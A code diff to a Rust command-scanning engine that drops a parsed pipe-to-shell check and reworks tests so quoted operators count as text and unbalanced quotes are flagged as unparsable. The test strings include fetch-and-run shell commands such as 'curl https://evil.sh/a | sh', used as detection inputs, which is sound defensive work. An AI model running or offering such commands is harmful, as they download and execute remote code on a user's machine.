@@ -9,7 +9,6 @@ use ignore::WalkBuilder;
 use crate::allow::Allowlists;
 use crate::command;
 use crate::download::{self, DownloadError, DownloadStatus, MacTools};
-use crate::finding::Finding;
 use crate::osv::{self, Cache, OsvClient, OsvMode, RULE_IDS};
 use crate::report::{Report, SkipReason, Skipped};
 use crate::rules::{HEAD_BYTES, RuleError, RuleSet, Target};
@@ -255,18 +254,6 @@ impl Engine {
             .collect()
     }
 
-    /// Reports `command/pipe-to-shell` for a download that runs without a pipe or a regex-visible
-    /// shape, under the same id so allowlists keep working; never a second finding of that rule.
-    fn add_parsed_pipe_to_shell(&self, command: &str, findings: &mut Vec<Finding>) {
-        const ID: &str = "command/pipe-to-shell";
-        if findings.iter().any(|f| f.rule_id == ID) || !command::runs_fetched_download(command) {
-            return;
-        }
-        if let Some(rule) = self.rules.rules().iter().find(|r| r.id == ID) {
-            findings.push(rule.command_finding(command));
-        }
-    }
-
     /// Checks a downloaded file. `tools` is `None` where the layer is not available (not macOS):
     /// the report then says the layer was skipped and carries a warning finding, never a pass.
     pub fn check_download(
@@ -295,16 +282,14 @@ impl Engine {
     /// Like `check_command`, then hides the findings `allow` allows; they stay listed in the report.
     pub fn check_command_with(&self, command: &str, allow: &Allowlists) -> Report {
         let macos = cfg!(target_os = "macos");
-        let views = command::unquoted_views(command);
         let mut findings: Vec<_> = self
             .rules
             .rules()
             .iter()
             .filter(|r| r.target() == Target::Command)
-            .flat_map(|r| r.check_command(command, &views))
+            .flat_map(|r| r.check_command(command))
             .collect();
         findings.extend(command::analyze(command, macos));
-        self.add_parsed_pipe_to_shell(command, &mut findings);
         command::stamp_fetch_domain(&mut findings, command);
         let applied = allow.apply(findings, &self.known_rule_ids());
         Report::from_rules(applied.kept)
@@ -382,19 +367,17 @@ mod tests {
     }
 
     #[test]
-    fn a_quoted_operator_keeps_todays_raw_behaviour() {
-        assert_eq!(rule_ids("echo 'curl x | sh'"), ["command/pipe-to-shell"]);
+    fn a_quoted_operator_is_text_not_a_pipe() {
+        assert!(rule_ids("echo 'curl x | sh'").is_empty());
         assert!(rule_ids("echo 'cu''rl x | sh'").is_empty());
         assert!(rule_ids("echo 'c\\url x ; sh'").is_empty());
     }
 
     #[test]
-    fn an_unbalanced_quote_does_not_panic_and_the_raw_match_still_runs() {
-        assert_eq!(
-            rule_ids("curl https://evil.sh/a | sh 'oops"),
-            ["command/pipe-to-shell"]
-        );
-        assert!(rule_ids("c\\url 'oops | sh").is_empty());
+    fn an_unbalanced_quote_does_not_panic_and_is_reported() {
+        for cmd in ["curl https://evil.sh/a | sh 'oops", "c\\url 'oops | sh"] {
+            assert_eq!(rule_ids(cmd), ["command/unparsable"], "{cmd}");
+        }
     }
 
     #[test]
